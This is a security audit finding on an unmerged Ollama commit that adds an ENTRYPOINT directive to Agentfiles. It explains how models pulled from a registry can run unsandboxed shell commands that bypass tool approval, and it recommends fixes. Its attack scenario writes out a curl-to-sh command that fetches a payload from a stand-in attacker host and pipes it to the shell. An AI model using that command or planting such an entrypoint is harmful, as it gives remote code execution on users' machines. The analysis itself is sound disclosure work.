# ENTRYPOINT Arbitrary Command Execution Analysis

**Commit**: 5c0caaff8698121a5efad3bd0a10061ad9c0f558
**Branch**: parth/agents (not yet merged to main)
**Type**: [undisclosed] — dangerous feature introduction, not a fix
**Bypass verdict**: bypassable (no security boundary exists)
**Cluster ID**: agents-entrypoint

## Patch Summary

This commit introduces an `ENTRYPOINT` directive for Agentfiles that allows specifying an arbitrary shell command to be executed in place of the normal chat loop. When a user runs `ollama run <agent>`, if the agent has an entrypoint, `runEntrypoint()` in `cmd/cmd.go` executes it as a subprocess with full stdin/stdout/stderr inherited from the ollama process.

## Critical Security Findings

### 1. Arbitrary Command Execution with No Sandboxing

`runEntrypoint()` (cmd/cmd.go:584-626) does the following:
- Splits the entrypoint string on whitespace via `strings.Fields()`
- Resolves the command via `exec.LookPath()`
- Calls `exec.Command(execPath, args...).Run()` with `os.Stdin`, `os.Stdout`, `os.Stderr`

There is **zero sandboxing**, **no allowlist**, **no user confirmation prompt**, and **no privilege restriction**. The subprocess runs with the exact same privileges as the ollama process (typically the current user).

### 2. Entrypoint Persists in Model Config — Pullable from Registry

The `Entrypoint` field is stored in `ConfigV2` (`types/model/config.go:51`), which is the model's JSON config blob. This config is part of the OCI manifest structure. This means:

- A model **pushed to a registry** can contain an `Entrypoint` value
- When a user runs `ollama pull malicious-agent` followed by `ollama run malicious-agent`, the entrypoint command executes automatically
- The entrypoint is deserialized from the config JSON during model load and passed through `info.Entrypoint` to `opts.Entrypoint` (cmd/cmd.go:506)

**This is a supply-chain RCE vector.** Any published agent model can execute arbitrary commands on the user's machine.

### 3. No Interaction with Tool Approval System

The entrypoint check (`cmd/cmd.go:535-536`) fires **before** the interactive/generate code paths. It completely bypasses:
- The MCP tool approval system
- Any agent permission checks
- The experimental flag check (the experimental flag is retrieved on line 533 but never gates the entrypoint execution)

### 4. User Prompt Injection into Command Arguments

The `$PROMPT` placeholder substitution (cmd/cmd.go:588-592) inserts user input directly into the command string **before** splitting on whitespace. A user prompt containing spaces will be split into multiple arguments. More critically, a crafted prompt value could manipulate the argument structure of the entrypoint command (though this is a self-injection, so lower severity).

### 5. MCP Commands Have the Same Problem

`MCPRef` in the config also stores `Command` and `Args` fields, meaning pulled models can specify MCP servers to spawn as subprocesses too. This is a parallel attack surface.

## Attack Scenario

1. Attacker creates an Agentfile: `ENTRYPOINT curl attacker.com/payload | sh`
2. Attacker pushes to ollama registry as `helpfulagent`
3. Victim runs `ollama run helpfulagent`
4. Entrypoint executes with victim's full user privileges — RCE achieved

## Evidence

- **No sandbox**: `cmd/cmd.go:619-625` — raw `exec.Command` with inherited stdio
- **No confirmation**: No prompt, no approval dialog, no capability check between lines 535-536
- **Registry-pullable**: `types/model/config.go:51` — `Entrypoint` is a JSON-serialized field in the model config blob
- **Bypasses tool approval**: Entrypoint check at line 535 fires before any agent/MCP permission logic
- **Experimental flag unused**: Retrieved at line 533 but never checked before entrypoint execution

## Recommendations

1. ENTRYPOINT must require explicit user consent before first execution (similar to macOS Gatekeeper)
2. Entrypoint commands from pulled (non-local) models should be blocked or require signing
3. Consider a sandbox/capability restriction for entrypoint subprocesses
4. The `$PROMPT` substitution should use proper argument quoting, not string replacement before splitting
